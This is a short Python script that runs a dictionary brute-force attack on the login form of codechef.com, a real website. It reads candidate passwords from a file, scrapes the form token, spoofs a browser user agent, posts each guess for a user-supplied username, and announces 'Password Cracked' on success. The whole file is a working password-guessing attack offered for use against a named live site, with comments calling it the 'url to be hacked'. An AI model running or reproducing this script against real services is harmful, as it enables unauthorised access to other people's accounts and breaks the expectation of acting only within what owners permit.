#importing the required packages in case of this we imported requests and bs4
import requests					
from bs4 import BeautifulSoup
#open the file in read mode that has all the combinations of passwords for bruteforce 
dictfile=open('dict.txt','r').readlines()	
#take the input from the user
username=raw_input("Enter the username: ")	
#make a dictionary of useagents of the web page which differs from brower to browser
headers={'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'} 
#iterator dictionary file line by line and fetch each password from the dictionary and try it 
for i in dictfile:
	#create a dictionary and assign all the values to it
	login_data={'name': username, 'pass': i , 'form_id': 'new_login_form' , 'op': 'login'}
	#now create a session and fetch the url and pass the values through the POST method
	with requests.Session() as s:
		#fetching the url to be hacked
		url="https://www.codechef.com/"
		#creating a get requests
		r=s.get(url,headers=headers)
		#scraping the entire website for a perticular keyword
		soup=BeautifulSoup(r.content,'html5lib')
		login_data['form_build_id']=soup.find('input',attrs={'name': 'form_build_id'})['value']
		#sending the dictionary created through post request
		r=s.post(url,data=login_data ,headers=headers)
		#searching for a specific keyword to indicate the website is hacked
		if "Hello" in r.content:
			print("Password Cracked")
			print("Password is: ",i)
			break
		else:
			print("Unsuccessfull: ",i)
